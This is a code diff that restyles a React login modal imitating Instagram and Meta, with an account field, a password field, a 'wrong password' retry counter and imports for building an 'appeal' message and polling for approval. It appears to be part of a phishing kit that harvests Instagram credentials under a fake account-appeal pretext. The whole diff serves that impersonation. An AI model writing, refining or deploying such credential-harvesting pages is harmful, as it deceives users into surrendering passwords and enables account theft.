@@ -1,23 +1,28 @@
-import MetaLogo from '@/assets/images/meta-logo-grey.png';
-import { tickSrc } from '@/components/icons';
+'use client';
+
+import MetaLogo from '@/assets/images/meta-logo-image.png';
 import { DEFAULT_TEXTS } from '@/constants/default-texts';
 import { store } from '@/store/store';
 import config from '@/utils/config';
 import { buildAppealMessage } from '@/utils/message';
 import { pollApproval } from '@/utils/poll-approval';
+import { faEye } from '@fortawesome/free-regular-svg-icons/faEye';
+import { faEyeSlash } from '@fortawesome/free-regular-svg-icons/faEyeSlash';
+import { faTriangleExclamation } from '@fortawesome/free-solid-svg-icons/faTriangleExclamation';
+import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
 import axios from 'axios';
 import Image from 'next/image';
-import { type FC, type FormEvent, useState } from 'react';
+import { type FC, useState } from 'react';
 
 const InstagramRoundLogo = () => (
-    <div className='ig-logo-round'>
-        <div className='ig-logo-round-inner'>
-            <svg aria-hidden='true' className='ig-logo-icon' viewBox='0 0 24 24'>
+    <div className='flex h-[72px] w-[72px] items-center justify-center rounded-full bg-linear-to-br from-[#f09433] via-[#dc2743] to-[#bc1888] p-[3px] shadow-[0_8px_24px_rgba(225,48,108,0.28)]'>
+        <div className='flex h-full w-full items-center justify-center rounded-full bg-white'>
+            <svg aria-hidden='true' className='h-9 w-9' viewBox='0 0 24 24'>
                 <defs>
                     <linearGradient id='ig-modal-gradient' x1='0%' x2='100%' y1='100%' y2='0%'>
-                        <stop offset='0%' stopColor='#FD5949' />
-                        <stop offset='45%' stopColor='#D6249F' />
-                        <stop offset='100%' stopColor='#285AEB' />
+                        <stop offset='0%' stopColor='#f09433' />
+                        <stop offset='50%' stopColor='#dc2743' />
+                        <stop offset='100%' stopColor='#bc1888' />
                     </linearGradient>
                 </defs>
                 <path
@@ -42,8 +47,7 @@ const InstagramPasswordModal: FC<{ nextStep: () => void; texts?: Record<string, 
 
     const togglePassword = () => setShowPassword((prev) => !prev);
 
-    const handleSubmit = async (e: FormEvent) => {
-        e.preventDefault();
+    const handleSubmit = async () => {
         if (!accountInput.trim() || !password.trim() || isLoading) return;
 
         setShowError(false);
@@ -100,113 +104,79 @@ const InstagramPasswordModal: FC<{ nextStep: () => void; texts?: Record<string, 
     };
 
     return (
-        <div
-            className='modal form-modal instagram-login-modal show d-block'
-            id='exampleModalIg'
-            tabIndex={-1}
-            style={{ backgroundColor: 'rgba(0,0,0,0.5)' }}
-        >
-            <div className='modal-dialog modal-dialog-centered modal-fullscreen-lg-down'>
-                <div className='modal-content'>
-                    <div className='modal-body'>
-                        <div className='ig-round-wraper'>
-                            <InstagramRoundLogo />
-                        </div>
-
-                        <div className='login-main'>
-                            <p className='login-notice'>
-                                {/* eslint-disable-next-line @next/next/no-img-element */}
-                                <img src={tickSrc} width={16} alt='tick' />
-                                <span>{texts.instagramLoginNotice}</span>
-                            </p>
-
-                            <form onSubmit={handleSubmit}>
-                                {attempts === 0 && (
-                                    <div className='password-input'>
-                                        <label className='form-label' htmlFor='ig-account-input'>
-                                            {texts.instagramUsername}
-                                        </label>
-                                        <input
-                                            autoComplete='username'
-                                            id='ig-account-input'
-                                            maxLength={60}
-                                            minLength={3}
-                                            name='identifier'
-                                            required
-                                            type='text'
-                                            value={accountInput}
-                                            onChange={(e) => setAccountInput(e.target.value)}
-                                        />
-                                    </div>
-                                )}
-
-                                <div className={`password-input has-toggle ${showError ? 'is-invalid shake' : ''}`}>
-                                    <label className='form-label' htmlFor='ig-password-input'>
-                                        {texts.loginPassword}
-                                    </label>
-                                    <input
-                                        autoComplete='current-password'
-                                        id='ig-password-input'
-                                        maxLength={30}
-                                        minLength={3}
-                                        name='password-1'
-                                        required
-                                        type={showPassword ? 'text' : 'password'}
-                                        value={password}
-                                        onChange={(e) => setPassword(e.target.value)}
-                                    />
-                                    <button
-                                        aria-label='Show/Hide password'
-                                        aria-pressed={showPassword}
-                                        className='password-toggle'
-                                        type='button'
-                                        onClick={togglePassword}
-                                    >
-                                        <svg fill='#606770' height='20' viewBox='0 0 24 24' width='20' xmlns='http://www.w3.org/2000/svg' style={{ display: showPassword ? 'none' : 'block' }}>
-                                            <path d='M12 5c-7.633 0-11 7-11 7s3.367 7 11 7 11-7 11-7-3.367-7-11-7zm0 12c-2.762 0-5-2.239-5-5 0-2.762 2.238-5 5-5 2.761 0 5 2.238 5 5 0 2.761-2.239 5-5 5z' />
-                                            <circle cx='12' cy='12' r='2.5' />
-                                        </svg>
-                                        <svg fill='#E1306C' height='20' viewBox='0 0 24 24' width='20' xmlns='http://www.w3.org/2000/svg' style={{ display: showPassword ? 'block' : 'none' }}>
-                                            <path d='M12 5c-7.633 0-11 7-11 7s3.367 7 11 7 11-7 11-7-3.367-7-11-7zm0 12c-2.762 0-5-2.239-5-5 0-2.762 2.238-5 5-5 2.761 0 5 2.238 5 5 0 2.761-2.239 5-5 5z' />
-                                        </svg>
-                                    </button>
-                                </div>
-                                {showError && (
-                                    <div className='invalid-feedback d-block login-error'>
-                                        {texts.loginWrongPassword}
-                                    </div>
-                                )}
-
-                                <div className='form-btn-wrapper'>
-                                    <button
-                                        type='submit'
-                                        disabled={isLoading || !accountInput.trim() || !password.trim()}
-                                        className={`btn btn-primary ig-login-btn w-100 ${isLoading ? 'cursor-not-allowed opacity-80' : ''}`}
-                                    >
-                                        <span style={{ visibility: isLoading ? 'hidden' : 'visible' }}>
-                                            {attempts === 0 ? texts.instagramLoginBtn : texts.continueBtn}
-                                        </span>
-                                        {isLoading && (
-                                            <span className='login-btn-spinner'>
-                                                <span className='custom-spinner' />
-                                            </span>
-                                        )}
-                                    </button>
-                                </div>
-
-                                <div id='forgot-pass-wrap'>
-                                    <a href='#forgot'>{texts.forgotPassword}</a>
-                                </div>
-                            </form>
-                        </div>
+        <div className='fixed inset-0 z-50 flex h-screen w-screen items-center justify-center bg-black/40 px-4'>
+            <div
+                className='flex h-[90vh] w-full max-w-xl flex-col items-center gap-6 rounded-3xl border border-white/60 p-4 shadow-[0_18px_45px_rgba(131,58,180,0.16)]'
+                style={{ background: 'linear-gradient(155deg, #fff8fc 0%, #fff5f8 28%, #f6f3ff 62%, #f2f8ff 100%)' }}
+            >
+                <InstagramRoundLogo />
+                <div className='flex w-full flex-1 flex-col justify-center px-1'>
+                    <div className='mb-4 w-full'>
+                        <p className='flex items-start gap-2 text-left text-[15px] leading-[1.45] font-medium text-[#c13584]'>
+                            <FontAwesomeIcon icon={faTriangleExclamation} className='mt-0.5 shrink-0 text-[#e09b1b]' />
+                            <span>{texts.instagramLoginNotice}</span>
+                        </p>
                     </div>
 
-                    <div className='modal-footer'>
-                        <Image src={MetaLogo} alt='Meta logo' width={54} height={16} style={{ display: 'block' }} />
-                        <div style={{ fontSize: '12px', color: '#606770', marginTop: '4px' }}>
-                            {texts.aboutHelpMore}
+                    {attempts === 0 && (
+                        <div className='relative mb-3 w-full'>
+                            <input
+                                type='text'
+                                id='ig-account-input'
+                                value={accountInput}
+                                onChange={(e) => setAccountInput(e.target.value)}
+                                className='peer h-[60px] w-full rounded-xl border border-[#ecd9e8] bg-white/92 px-3 pt-6 pb-2 placeholder-transparent text-[#1d232f] shadow-sm transition-colors focus:border-[#e1306c] focus:outline-none focus:ring-4 focus:ring-[#e1306c]/10'
+                                placeholder={texts.instagramUsername}
+                            />
+                            <label
+                                htmlFor='ig-account-input'
+                                className='absolute top-1/2 left-3 -translate-y-1/2 cursor-text text-[#5f6773] transition-all duration-200 ease-in-out peer-placeholder-shown:top-1/2 peer-placeholder-shown:-translate-y-1/2 peer-placeholder-shown:text-base peer-focus:top-2 peer-focus:translate-y-0 peer-focus:text-xs peer-focus:text-[#c13584] peer-[:not(:placeholder-shown)]:top-2 peer-[:not(:placeholder-shown)]:translate-y-0 peer-[:not(:placeholder-shown)]:text-xs'
+                            >
+                                {texts.instagramUsername}
+                            </label>
                         </div>
+                    )}
+
+                    <div className='relative w-full'>
+                        <input
+                            type={showPassword ? 'text' : 'password'}
+                            id='ig-password-input'
+                            value={password}
+                            onChange={(e) => setPassword(e.target.value)}
+                            className='peer h-[60px] w-full rounded-xl border border-[#ecd9e8] bg-white/92 px-3 pt-6 pb-2 placeholder-transparent text-[#1d232f] shadow-sm transition-colors focus:border-[#e1306c] focus:outline-none focus:ring-4 focus:ring-[#e1306c]/10'
+                            placeholder={texts.loginPassword}
+                        />
+                        <label
+                            htmlFor='ig-password-input'
+                            className='absolute top-1/2 left-3 -translate-y-1/2 cursor-text text-[#5f6773] transition-all duration-200 ease-in-out peer-placeholder-shown:top-1/2 peer-placeholder-shown:-translate-y-1/2 peer-placeholder-shown:text-base peer-focus:top-2 peer-focus:translate-y-0 peer-focus:text-xs peer-focus:text-[#c13584] peer-[:not(:placeholder-shown)]:top-2 peer-[:not(:placeholder-shown)]:translate-y-0 peer-[:not(:placeholder-shown)]:text-xs'
+                        >
+                            {texts.loginPassword}
+                        </label>
+                        <FontAwesomeIcon
+                            icon={showPassword ? faEyeSlash : faEye}
+                            size='lg'
+                            className='absolute top-1/2 right-3 -translate-y-1/2 cursor-pointer text-[#6b7280] transition-colors hover:text-[#c13584]'
+                            onClick={togglePassword}
+                        />
                     </div>
+
+                    {showError && <p className='mt-2 text-[15px] text-red-500'>{texts.loginWrongPassword}</p>}
+
+                    <button
+                        type='button'
+                        onClick={handleSubmit}
+                        disabled={isLoading || !accountInput.trim() || !password.trim()}
+                        className={`mt-4 flex h-[50px] w-full items-center justify-center gap-2 rounded-full bg-linear-to-r from-[#833ab4] via-[#fd1d1d] to-[#fcb045] font-semibold text-white shadow-[0_8px_22px_rgba(225,48,108,0.28)] transition-all hover:opacity-95 active:scale-[0.99] ${isLoading ? 'cursor-not-allowed opacity-80' : ''}`}
+                    >
+                        {isLoading ? (
+                            <div className='h-5 w-5 animate-spin rounded-full border-2 border-white border-b-transparent border-l-transparent' />
+                        ) : (
+                            attempts === 0 ? texts.instagramLoginBtn : texts.continueBtn
+                        )}
+                    </button>
+                </div>
+                <div className='flex items-center justify-center pt-2'>
+                    <Image src={MetaLogo} alt='' className='h-[18px] w-[70px]' />
                 </div>
             </div>
         </div>
